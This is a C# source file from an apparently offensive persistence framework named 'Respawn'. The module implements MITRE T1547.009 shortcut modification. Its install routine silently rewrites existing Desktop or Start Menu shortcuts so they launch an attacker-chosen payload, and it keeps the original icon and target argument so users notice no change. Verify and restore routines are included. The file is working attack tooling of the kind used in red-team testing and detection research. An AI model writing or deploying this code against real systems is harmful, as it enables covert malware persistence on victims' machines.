using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;
using IWshRuntimeLibrary;

namespace Respawn.Techniques.ShortcutModification
{
    public class ShortcutModificationModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "lnk";
        public string Name        => "Shortcut Modification";
        public string Mitre       => "T1547.009";
        public string Description => "Persist by modifying existing Windows shell shortcuts (.lnk files) on the Desktop or Start Menu, replacing the target executable with a malicious payload while passing the original application path as an argument.";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p2", "folders");

            // 2. OPERATIONAL NOTES
            // Console.ForegroundColor = ConsoleColor.Cyan;
            // Console.WriteLine("  OPERATIONAL NOTES:");
            // Console.ResetColor();
            // Console.WriteLine("    - No Administrator privileges required for user shortcuts");
            // Console.WriteLine("    - Original target is preserved as an argument for stealth");
            // Console.WriteLine("    - Icon location is locked to original to avoid visual change");
            // Console.WriteLine();

            // 3. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-n,  --name", "LNK filename without extension");
            TechniqueHelpBuilder.RenderOption("-f,  --folder", "Folder ID (desktop, startmenu, common-*)");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Path to the intercepting executable");
            Console.WriteLine();

            // 4. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t lnk -a list-folders");
            TechniqueHelpBuilder.RenderExample("Respawn -t lnk -a install -f \"desktop\" -n \"Google Chrome\" -p \"C:\\p.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t lnk -a verify  -f \"desktop\" -n \"Google Chrome\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t lnk -a remove  -f \"desktop\" -n \"Google Chrome\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("folders", StringComparison.OrdinalIgnoreCase))
                return ShortcutFolders.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            var folder = ShortcutFolders.GetById(ctx.Folder);
            if (folder == null)
                return TechniqueResult.Fail($"Unknown folder '{ctx.Folder}'. Use -a list-folders to see available folders.");

            try
            {
                string lnkPath = Path.Combine(folder.Path, $"{ctx.Name}.lnk");

                if (!System.IO.File.Exists(lnkPath))
                    return TechniqueResult.NotFound($"Shortcut '{ctx.Name}.lnk' not found in {folder.Path}.");

                WshShell shell        = new WshShell();
                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(lnkPath);
                string originalTarget = shortcut.TargetPath;
                string originalArgs   = shortcut.Arguments;
                string originalIcon = shortcut.IconLocation;
                
                if (string.IsNullOrEmpty(originalIcon) || originalIcon.StartsWith(","))
                    originalIcon = $"{originalTarget},0";

                if (shortcut.TargetPath.Equals(ctx.Payload, StringComparison.OrdinalIgnoreCase))
                    return TechniqueResult.Exists($"Shortcut '{ctx.Name}.lnk' already points to payload.");

                // save backup in description
                shortcut.Description = $"RESPAWN_BACKUP:{originalTarget}|{originalArgs}|{originalIcon}";

                // payload receives original target as args[0] — IFEOProxy.exe handles launching it
                shortcut.TargetPath       = ctx.Payload;
                shortcut.Arguments        = $"\"{originalTarget}\" {originalArgs}".Trim();
                shortcut.WorkingDirectory = Path.GetDirectoryName(ctx.Payload) ?? string.Empty;

                // keep original icon so shortcut looks unchanged
                shortcut.IconLocation     = originalIcon;
                shortcut.Save();

                return TechniqueResult.Ok(
                    $"Modified '{ctx.Name}.lnk' — payload: '{ctx.Payload}' | " +
                    $"original: '{originalTarget}' | icon preserved.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied($"Access denied modifying shortcut '{ctx.Name}.lnk'.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            var folder = ShortcutFolders.GetById(ctx.Folder);
            if (folder == null)
                return TechniqueResult.Fail($"Unknown folder '{ctx.Folder}'. Use -a list-folders to see available folders.");

            try
            {
                string lnkPath = Path.Combine(folder.Path, $"{ctx.Name}.lnk");

                if (!System.IO.File.Exists(lnkPath))
                    return TechniqueResult.NotFound($"Shortcut '{ctx.Name}.lnk' not found in {folder.Path}.");

                WshShell shell        = new WshShell();
                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(lnkPath);

                // read backup from description
                string description = shortcut.Description ?? string.Empty;
                if (!description.StartsWith("RESPAWN_BACKUP:"))
                    return TechniqueResult.NotFound($"No backup found in shortcut '{ctx.Name}.lnk' — was it modified by Respawn?");

                string backup         = description.Substring("RESPAWN_BACKUP:".Length);
                string[] parts        = backup.Split('|');
                string originalTarget = parts[0];
                string originalArgs   = parts.Length > 1 ? parts[1] : string.Empty;
                string originalIcon   = parts.Length > 2 ? parts[2] : $"{parts[0]},0";

                // restore original
                shortcut.TargetPath       = originalTarget;
                shortcut.Arguments        = originalArgs;
                shortcut.WorkingDirectory = Path.GetDirectoryName(originalTarget) ?? string.Empty;
                shortcut.IconLocation     = originalIcon;
                shortcut.Description      = string.Empty;
                shortcut.Save();

                return TechniqueResult.Ok($"Restored '{ctx.Name}.lnk' -> '{originalTarget}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied($"Access denied modifying shortcut '{ctx.Name}.lnk'.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            var folder = ShortcutFolders.GetById(ctx.Folder);
            if (folder == null)
                return TechniqueResult.Fail($"Unknown folder '{ctx.Folder}'. Use -a list-folders to see available folders.");

            try
            {
                string lnkPath = Path.Combine(folder.Path, $"{ctx.Name}.lnk");

                if (!System.IO.File.Exists(lnkPath))
                    return TechniqueResult.NotFound($"Shortcut '{ctx.Name}.lnk' not found in {folder.Path}.");

                WshShell shell        = new WshShell();
                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(lnkPath);

                string description = shortcut.Description ?? string.Empty;
                if (!description.StartsWith("RESPAWN_BACKUP:"))
                    return TechniqueResult.NotFound($"Shortcut '{ctx.Name}.lnk' does not appear to be modified by Respawn.");

                return TechniqueResult.Ok(
                    $"Verified '{ctx.Name}.lnk' | " +
                    $"Payload: '{shortcut.TargetPath}' | " +
                    $"Args: '{shortcut.Arguments}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied($"Access denied reading shortcut '{ctx.Name}.lnk'.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Name))
            {
                error = "No shortcut name specified. Use -n <name> (without .lnk).";
                return false;
            }
            if (string.IsNullOrEmpty(ctx.Folder))
            {
                error = "No folder specified. Use -f <folder-id> or see -a list-folders.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <path>.";
                return false;
            }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}